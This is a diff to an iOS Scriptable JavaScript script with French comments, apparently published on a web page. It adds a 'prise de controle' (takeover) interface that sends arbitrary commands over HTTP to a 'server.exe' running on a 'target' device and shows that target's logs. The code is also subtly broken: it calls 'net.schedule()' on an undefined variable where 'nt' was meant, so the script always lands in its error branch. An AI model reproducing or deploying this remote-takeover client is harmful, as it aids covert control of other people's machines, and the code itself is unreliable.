@@ -71,18 +71,62 @@
 // ls, pour voir tout les fichiers et
 // dossiers.
 
+// v1.3
+
+
+const KEY = "afficher_une_fois"
+if (!Keychain.contains(KEY)) {
+
+  const requi = new Alert()
+  requi.title = "Requis pour que le programme fonctionne bien :"
+  requi.message = "- Activez les notifications"
+  requi.addCancelAction("Je le fait de suite")
+  requi.addAction("C'est fait !")
+  await requi.present()
+  Keychain.set(KEY, "true")
+}
+
+
+//////////////////////////////////
+// interface de prise de controle:
+
 let cmd = ""
 
-// Remplace l adresse ip par celle de ton pc
+if(cmd == ""){
+   console.warn("Tu as pas entrer de commande !\n\n")
+}
+// Remplace l ip par celle de ton pc
 // tape (ipconfig) dans ta console windows. Mais reste sur le port 8080
 
 let req = new Request("http://192.168.1.8:8080/run?cmd=" + encodeURIComponent(cmd))
 
 // Si tu veux changer de port demande moi
-// je ferais une autre version
+// je ferais une nouvelle version
+try {
+  console.log("Tentative de connexion en cours...\n\n")
+  let nt = new Notification()
+  nt.title="Tentative de connexion..."
+  nt.body="Vous serez avertis quand vous serez connecter a la cible."
+  net.schedule()
 
-let res = await req.loadString()
-console.log(res)
+  let res = await req.loadString()
+  console.warn("Connexion reussi !")
+
+  console.log(res)
+
+  let xd = new Notification()
+  xd.title="Connexion réussi !"
+  xd.body="Cliquez sur le [ ] qui contient un chiffre a l interieur, pour ouvrir les logs de votre cible"
+  xd.schedule()
+
+} catch (error) {
+  console.error("Impossible de se connecter ! Verifiez que le program: (server.exe) est en cours sur l appareil cible")
+
+let rkx = new Notification()
+  rkx.title="Connexion impossible !"
+  rkx.body="Verifiez que le program (server.exe) tourne sur la cible"
+  rkx.schedule()
+}
     </pre>
 
     <script>
